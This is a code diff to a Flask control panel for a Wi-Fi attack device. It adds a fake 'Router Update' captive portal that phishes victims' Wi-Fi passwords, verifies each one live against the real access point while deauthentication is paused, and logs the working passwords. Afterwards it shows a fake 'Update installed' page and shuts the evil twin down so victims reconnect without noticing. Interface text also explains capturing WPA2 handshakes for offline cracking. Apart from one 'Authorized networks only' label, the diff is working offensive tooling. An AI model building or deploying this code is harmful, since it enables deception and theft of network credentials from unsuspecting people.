@@ -3,7 +3,7 @@
 import os, json, subprocess, csv, io, datetime, glob, uuid, signal, re, sys, threading, time, shutil
 from functools import wraps
 from html import escape as html_escape
-from flask import Flask, request, jsonify, Response
+from flask import Flask, request, jsonify, Response, redirect
 from werkzeug.security import check_password_hash, generate_password_hash
 
 app = Flask(__name__)
@@ -48,6 +48,7 @@ WLAN1_OWNER_NAMES = {'beacon': 'Beacon Flood', 'deauth': 'Deauth', 'pmkid': 'PMK
 _saved_lock = threading.Lock()
 _audit_lock = threading.Lock()
 _scan_lock = threading.Lock()
+_creds_lock = threading.Lock()
 
 CONFIG_FILE = '/etc/pinapple/config.json'
 CREDS_LOG = '/var/log/pinapple/creds.log'
@@ -74,6 +75,7 @@ PORTAL_LABELS = {
     'airport': ('Airport Portal', 'Email + password, terminal styling'),
     'library': ('Library Portal', 'Name + library card number'),
     'gym': ('Gym Portal', 'Email + password, dark member styling'),
+    'wifi-psk': ('Router Update', 'Wi-Fi password, validated against the target'),
 }
 DEAUTH_HELPER = '/usr/local/bin/pinapple-deauth'
 BEACON_HELPER = '/usr/local/bin/pinapple-beacon-flood'
@@ -2355,16 +2357,25 @@ def creds_page():
     def fd(e):
         return ', '.join('{}:{}'.format(html_escape(str(k)), html_escape(str(v)))
                          for k,v in e.get('data',{}).items())
-    rows = ''.join('<tr><td style="font-size:0.75rem">{}</td><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td><span class="badge bb">{}</span></td><td style="font-size:0.8rem">{}</td></tr>'.format(
+    rows = ''.join('<tr><td style="font-size:0.75rem">{}</td><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td><span class="badge bb">{}</span></td><td style="font-size:0.8rem">{}</td><td><button class="btn btn-danger" style="padding:6px 10px" onclick="deleteCred({i})" title="Delete entry">&#128465;</button></td></tr>'.format(
         html_escape(str(e.get('timestamp',''))), html_escape(str(e.get('client_ip',''))),
-        html_escape(str(e.get('client_mac',''))), html_escape(str(e.get('portal_type',''))), fd(e)) for e in entries)
+        html_escape(str(e.get('client_mac',''))), html_escape(str(e.get('portal_type',''))), fd(e), i=i)
+        for i, e in enumerate(entries))
     if not rows:
-        rows = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No credentials captured yet</td></tr>'
+        rows = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No credentials captured yet</td></tr>'
     c = """<div class="sh"><span class="st">Captured Credentials ({})</span>
 <a href="/api/creds/export" class="btn btn-outline" style="font-size:0.8rem">Export CSV</a></div>
-<div class="twrap"><table class="resp"><thead><tr><th>Timestamp</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th></tr></thead>
+<div class="twrap"><table class="resp"><thead><tr><th>Timestamp</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th><th></th></tr></thead>
 <tbody>{}</tbody></table></div>""".format(len(entries), rows)
-    return page('Credentials', c, 'creds')
+    js = """<script>
+async function deleteCred(i){
+  if(!confirm('Delete this credential entry?')) return;
+  const r = await api('/api/creds/delete','POST',{index:i});
+  if(r && r.ok){ toast('Entry deleted','success'); setTimeout(function(){location.reload();},400); }
+  else { toast('Delete failed: '+((r&&r.error)||'unknown'),'error',6000); }
+}
+</script>"""
+    return page('Credentials', c, 'creds', js)
 
 @app.route('/api/creds/export')
 @require_auth
@@ -3950,6 +3961,168 @@ def api_pmkid_stop():
 
 
 # Evil Twin Routes
+PSK_HELPER = '/usr/local/bin/pinapple-psk-check'
+LAST_PSK = '/var/lib/pinapple/last_psk.json'
+_psk_lock = threading.Lock()
+_evil_twin_last = [None]
+
+
+def _client_mac_for_ip(ip):
+    try:
+        with open('/proc/net/arp') as handle:
+            next(handle)
+            for line in handle:
+                parts = line.split()
+                if len(parts) >= 4 and parts[0] == ip:
+                    return parts[3]
+    except OSError:
+        pass
+    return 'unknown'
+
+
+def _active_portal_slug():
+    try:
+        target = os.readlink(ACTIVE_PORTAL)
+        return os.path.splitext(os.path.basename(target))[0] or 'unknown'
+    except OSError:
+        return 'unknown'
+
+
+def _log_credential(client_ip, client_mac, portal_type, data):
+    entry = {
+        'timestamp': datetime.datetime.now().isoformat(timespec='seconds'),
+        'client_ip': client_ip or 'unknown',
+        'client_mac': client_mac or 'unknown',
+        'portal_type': portal_type or 'unknown',
+        'data': data,
+    }
+    with _creds_lock:
+        try:
+            os.makedirs(os.path.dirname(CREDS_LOG), exist_ok=True)
+            with open(CREDS_LOG, 'a') as handle:
+                handle.write(json.dumps(entry) + '\n')
+            os.chmod(CREDS_LOG, 0o600)
+        except OSError:
+            pass
+    return entry
+
+
+def get_last_psk():
+    if _evil_twin_last[0] is None:
+        data = read_json_file(LAST_PSK, {})
+        _evil_twin_last[0] = data if isinstance(data, dict) and data else None
+    return _evil_twin_last[0]
+
+
+def remember_last_psk(record):
+    _evil_twin_last[0] = record
+    try:
+        os.makedirs(os.path.dirname(LAST_PSK), exist_ok=True)
+        with open(LAST_PSK, 'w') as handle:
+            json.dump(record, handle, indent=2)
+        os.chmod(LAST_PSK, 0o600)
+    except OSError:
+        pass
+
+
+def clear_last_psk():
+    _evil_twin_last[0] = None
+    try:
+        os.remove(LAST_PSK)
+    except OSError:
+        pass
+
+
+def _twin_pause_deauth(proc):
+    """Freeze the deauth helper so our own validation association survives."""
+    if proc is None:
+        return False
+    try:
+        os.killpg(os.getpgid(proc.pid), signal.SIGSTOP)
+        return True
+    except OSError:
+        return False
+
+
+def _twin_resume_deauth(proc):
+    if proc is None:
+        return
+    try:
+        os.killpg(os.getpgid(proc.pid), signal.SIGCONT)
+    except OSError:
+        pass
+
+
+def validate_psk_with_ap(psk, timeout=18):
+    """Check a passphrase by really associating to the target AP with wlan1.
+
+    This is the ESP32 trick: a correct PSK completes the WPA2 4-way handshake,
+    a wrong one is rejected by the AP. No cracking, no guessing.
+    """
+    if not _psk_lock.acquire(blocking=False):
+        return {'result': 'error', 'detail': 'another password check is already running'}
+    try:
+        info = _evil_twin_info[0] or read_json_file(EVILTWIN_STATE, {})
+        ssid = str(info.get('ssid', '')).strip()
+        bssid = str(info.get('bssid', '')).strip()
+        if not ssid:
+            return {'result': 'error', 'detail': 'no Evil Twin target is known'}
+        if not os.path.exists(PSK_HELPER):
+            return {'result': 'error',
+                    'detail': 'pinapple-psk-check is not installed (re-run install.sh)'}
+        proc = _evil_twin_job[0]
+        paused = _twin_pause_deauth(proc)
+        try:
+            r = subprocess.run(
+                [PSK_HELPER, '--ssid', ssid, '--bssid', bssid,
+                 '--psk', psk, '--timeout', str(timeout)],
+                capture_output=True, text=True, timeout=timeout + 20)
+            payload = {}
+            for line in (r.stdout or '').strip().splitlines():
+                try:
+                    payload = json.loads(line)
+                except ValueError:
+                    continue
+            if not payload:
+                detail = (r.stderr or r.stdout or 'helper produced no result').strip()
+                return {'result': 'error', 'detail': detail.splitlines()[-1][:200]}
+            audit('PSK check for %s: %s (%s)'
+                  % (ssid, payload.get('result'), payload.get('detail', '')),
+                  'info' if payload.get('result') == 'ok' else 'warn')
+            return payload
+        except subprocess.SubprocessError as exc:
+            return {'result': 'error', 'detail': str(exc)}
+        finally:
+            if paused:
+                _twin_resume_deauth(proc)
+            try:
+                set_wlan1_channel(int(info.get('channel') or 6))
+            except Exception:
+                pass
+    finally:
+        _psk_lock.release()
+
+
+def _evil_twin_shutdown():
+    """Stop the twin, restore the real AP and free wlan1."""
+    had_twin = bool(_evil_twin_job[0] is not None or
+                    os.path.exists(EVILTWIN_STATE) or
+                    os.path.exists(EVILTWIN_BACKUP))
+    if _evil_twin_job[0] is None:
+        state = read_json_file(EVILTWIN_STATE, {})
+        pid = state.get('pid')
+        if pid:
+            safe_kill_pid(pid, 'pinapple-deauth')
+    terminate_process_group(_evil_twin_job[0])
+    _evil_twin_job[0] = None
+    _evil_twin_info[0] = None
+    release_wlan1('eviltwin')
+    if had_twin:
+        restore_ap_after_eviltwin('twin stopped')
+    restore_wlan1_idle()
+    return had_twin
+
+
 def _twin_capture_start(channel):
     """Capture EAPOL from the air on wlan1 while the twin runs.
 
@@ -4244,7 +4417,8 @@ def api_evil_twin_status():
                     'channel': info.get('channel', ''), 'started': info.get('started', ''),
                     'security': info.get('security', ''),
                     'error': ('' if running else (_evil_twin_error[0] or '')),
-                    'capture': _twin_capture_payload()})
+                    'capture': _twin_capture_payload(),
+                    'last_psk': get_last_psk() or {}})
 
 
 @app.route('/api/wlan1/evil-twin/stop', methods=['POST'])
@@ -4253,22 +4427,124 @@ def api_evil_twin_stop():
     if _evil_twin_starting[0]:
         return jsonify({'ok': False,
                         'error': 'the twin is still starting; try again in a few seconds'})
-    had_twin = bool(_evil_twin_job[0] is not None or
-                    os.path.exists(EVILTWIN_STATE) or
-                    os.path.exists(EVILTWIN_BACKUP))
-    if _evil_twin_job[0] is None:
-        state = read_json_file(EVILTWIN_STATE, {})
-        pid = state.get('pid')
-        if pid:
-            safe_kill_pid(pid, 'pinapple-deauth')
-    terminate_process_group(_evil_twin_job[0])
-    _evil_twin_job[0] = None
-    _evil_twin_info[0] = None
-    release_wlan1('eviltwin')
-    if had_twin:
-        restore_ap_after_eviltwin()
-    restore_wlan1_idle()
-    return jsonify({'ok': True, 'stopped': had_twin})
+    return jsonify({'ok': True, 'stopped': _evil_twin_shutdown()})
+
+@app.route('/portal/submit', methods=['POST'])
+def portal_submit():
+    """Captive portal submit.
+
+    With the "Router Update" template this validates the typed Wi-Fi password
+    against the target AP over wlan1 (the ESP32 trick): a correct PSK finishes
+    the WPA2 4-way handshake, a wrong one is rejected. On success the password
+    is stored, the twin is shut down and the victim reconnects to the real AP.
+    Every other template just records the form.
+    """
+    data = request.form.to_dict()
+    client_ip = request.headers.get('X-Real-IP') or (request.remote_addr or '')
+    client_mac = _client_mac_for_ip(client_ip)
+    portal_type = str(data.get('portal_type') or _active_portal_slug()).strip()
+    psk = str(data.get('wifi_password') or data.get('password') or '').strip()
+
+    twin_state = _evil_twin_info[0] or read_json_file(EVILTWIN_STATE, {})
+    twin_running = bool(_evil_twin_job[0] is not None or _evil_twin_starting[0] or twin_state)
+
+    if portal_type == 'wifi-psk' and psk and twin_running:
+        if not (8 <= len(psk.encode('utf-8', 'ignore')) <= 63):
+            return Response(
+                PORTAL_RETRY_HTML.replace(
+                    '{{reason}}',
+                    'That password is too short. Wi-Fi passwords have at least 8 characters.'),
+                mimetype='text/html')
+        check = validate_psk_with_ap(psk)
+        ssid = str(twin_state.get('ssid', ''))
+        if check.get('result') == 'ok':
+            _log_credential(client_ip, client_mac, 'wifi-psk',
+                            {'ssid': ssid, 'bssid': str(twin_state.get('bssid', '')),
+                             'password': psk, 'verified': 'yes'})
+            remember_last_psk({
+                'ssid': ssid, 'bssid': str(twin_state.get('bssid', '')),
+                'password': psk, 'verified': 'yes',
+                'client_ip': client_ip, 'client_mac': client_mac,
+                'at': datetime.datetime.now().isoformat(timespec='seconds'),
+            })
+            audit('Portal: Wi-Fi password verified for %s (%s)' % (ssid, client_mac), 'warn')
+            _evil_twin_shutdown()
+            return Response(PORTAL_OK_HTML, mimetype='text/html')
+        if check.get('result') == 'invalid':
+            audit('Portal: rejected Wi-Fi password for %s (%s)' % (ssid, client_mac), 'warn')
+            return Response(
+                PORTAL_RETRY_HTML.replace(
+                    '{{reason}}',
+                    'Incorrect Wi-Fi password. Check the password printed on the router and try again.'),
+                mimetype='text/html')
+        return Response(
+            PORTAL_RETRY_HTML.replace(
+                '{{reason}}',
+                'Could not verify the password right now. Wait a few seconds and try again.'),
+            mimetype='text/html')
+
+    # Every other portal template keeps the original capture-only behaviour.
+    _log_credential(client_ip, client_mac, portal_type,
+                    {k: v for k, v in data.items() if k != 'portal_type'})
+    return redirect('/portal/success')
+
+
+PORTAL_OK_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Update installed</title>
+<style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;
+color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0}
+.c{background:#1e293b;border:1px solid #334155;border-radius:14px;padding:34px 26px;max-width:400px;text-align:center}
+.ok{width:56px;height:56px;border-radius:50%;background:#16a34a;color:#fff;font-size:30px;line-height:56px;margin:0 auto 18px}
+h1{font-size:20px;margin:0 0 10px}p{color:#94a3b8;font-size:14px;line-height:1.6;margin:0}
+.sp{margin-top:22px;height:4px;border-radius:2px;background:#0ea5e9;animation:p 1.6s infinite}
+@keyframes p{0%{opacity:.25}50%{opacity:1}100%{opacity:.25}}</style></head><body><div class="c">
+<div class="ok">&#10003;</div><h1>Update installed</h1>
+<p>The router is restarting. This page will close and your device will reconnect to your normal network in a few seconds.</p>
+<div class="sp"></div></div>
+<script>setTimeout(function(){try{window.close()}catch(e){}},4000);</script></body></html>"""
+
+PORTAL_RETRY_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Password not accepted</title>
+<style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;
+color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;margin:0}
+.c{background:#1e293b;border:1px solid #334155;border-radius:14px;padding:30px 26px;max-width:400px;text-align:center}
+h1{font-size:19px;margin:0 0 10px}p{color:#94a3b8;font-size:14px;line-height:1.6;margin:0 0 20px}
+a{display:inline-block;padding:13px 22px;border-radius:8px;background:#0ea5e9;color:#04121f;
+font-weight:700;text-decoration:none}</style></head><body><div class="c">
+<h1>Password not accepted</h1><p>{{reason}}</p><a href="/">Try again</a></div></body></html>"""
+
+
+@app.route('/api/evil-twin/last-psk/delete', methods=['POST'])
+@require_auth
+def api_last_psk_delete():
+    clear_last_psk()
+    audit('Last captured Wi-Fi password cleared', 'warn')
+    return jsonify({'ok': True})
+
+
+@app.route('/api/creds/delete', methods=['POST'])
+@require_auth
+def api_creds_delete():
+    index = (request.json or {}).get('index')
+    with _creds_lock:
+        entries = get_creds()
+        try:
+            index = int(index)
+        except (TypeError, ValueError):
+            return jsonify({'ok': False, 'error': 'invalid index'})
+        if index < 0 or index >= len(entries):
+            return jsonify({'ok': False, 'error': 'entry not found'})
+        entries.pop(index)
+        try:
+            with open(CREDS_LOG, 'w') as handle:
+                for entry in entries:
+                    handle.write(json.dumps(entry) + '\n')
+            os.chmod(CREDS_LOG, 0o600)
+        except OSError as exc:
+            return jsonify({'ok': False, 'error': str(exc)})
+    audit('Credential entry deleted', 'warn')
+    return jsonify({'ok': True, 'count': len(entries)})
+
 
 @app.route('/wlan1')
 @require_auth
@@ -4487,9 +4763,8 @@ def wlan1_page():
     <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
   <p class="hint" style="margin:-8px 0 10px">Clones a target SSID/BSSID on wlan0 and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
   <div class="warnbox">Starting the Evil Twin rebuilds wlan0, which serves this dashboard, so this page will lose the network for a few seconds — that is expected. When the twin is up, reconnect to the target SSID and open <code>http://10.0.0.1:8080</code> again.<br><br>
-  <strong>Saved WPA2 network (iPhone/Android):</strong> the phone will never join an open clone of a network it saved as WPA2 — it reuses the saved profile and fails. Two working paths:<br>
-  &bull; <strong>Capture the key:</strong> put any dummy passphrase (8+ chars) in the field below, start the twin, let the phone attempt the saved network. Its 4-way handshake is recorded on the twin channel; download the <code>.22000</code> hash and crack it (hashcat/aircrack).<br>
-  &bull; <strong>Join the twin:</strong> once you know the real passphrase, start the twin with it — SSID, security and key then match the saved profile and the phone joins by itself for the portal.<br>
+  <strong>Router Update portal (live password check):</strong> select the <em>Router Update</em> portal in Settings. When the victim types the Wi-Fi password, wlan1 leaves the twin, associates to the real AP with that password and verifies it — a wrong password is rejected, a correct one is stored in Credentials and shown here, and the twin shuts down so the device reconnects to its normal network. Works for targets the device will join (open network, unknown SSID, or the correct passphrase).<br><br>
+  <strong>Saved WPA2 network (iPhone/Android):</strong> the phone will not join an open clone of a network it saved as WPA2. Put any dummy passphrase (8+ chars), start the twin and let the phone attempt the saved network: its 4-way handshake is recorded on the twin channel, so you can download the <code>.22000</code> and crack it. Once you know the passphrase, start the twin with it and the phone joins by itself.<br>
   Leave the passphrase empty only for an open target or an SSID the device never saved.</div>
   <div class="status-card" role="status" aria-live="polite" id="et-status-card">
     <span class="dot"></span>
@@ -4497,6 +4772,7 @@ def wlan1_page():
     <span class="sc-meta" id="et-meta"></span>
   </div>
   <div id="et-capture" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid var(--bdr);border-radius:10px;background:var(--card);line-height:1.7"></div>
+  <div id="et-last" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid rgba(46,213,115,.4);border-radius:10px;background:var(--card);line-height:1.7"></div>
   <div class="card">
     <div class="fg">
       <label>Target network</label>
@@ -5128,6 +5404,22 @@ async function refreshEvilTwinStatus(){
       r.error || 'No twin running', '');
   }
   const cap = r.capture || {};
+  const last = r.last_psk || {};
+  const lastEl = document.getElementById('et-last');
+  if(lastEl){
+    if(last.password){
+      lastEl.style.display='block';
+      lastEl.innerHTML = '<strong style="color:var(--grn)">Last captured Wi-Fi password</strong>'
+        + ' &middot; ' + esc(last.ssid || '?') + ' &middot; ' + esc(last.client_mac || '')
+        + '<div style="margin-top:8px;font-family:monospace;font-size:1rem">' + esc(last.password) + '</div>'
+        + '<div style="margin-top:8px;font-size:0.75rem;color:var(--dim)">' + esc(last.at || '')
+        + ' &middot; saved in Credentials</div>'
+        + '<button class="btn btn-danger" style="margin-top:10px;padding:6px 12px" onclick="forgetLastPsk()">&#128465; Delete password</button>';
+    } else {
+      lastEl.style.display='none';
+      lastEl.innerHTML='';
+    }
+  }
   const capEl = document.getElementById('et-capture');
   if(capEl){
     if(cap.active){
@@ -5153,6 +5445,13 @@ async function refreshEvilTwinStatus(){
   }
   if((running || starting) && !etPoll) etPoll = setInterval(function(){ if(wlActiveTab === 'eviltwin') refreshEvilTwinStatus(); }, 3000);
   if(!running && !starting && etPoll){ clearInterval(etPoll); etPoll = null; }
+}
+
+async function forgetLastPsk(){
+  if(!confirm('Delete the captured Wi-Fi password shown here? The entry in Credentials stays until you delete it there.')) return;
+  const r = await api('/api/evil-twin/last-psk/delete','POST',{});
+  if(r && r.ok){ toast('Captured password cleared','success'); refreshEvilTwinStatus(); }
+  else { toast('Delete failed: '+((r&&r.error)||'unknown'),'error',6000); }
 }
 
 async function startEvilTwin(){
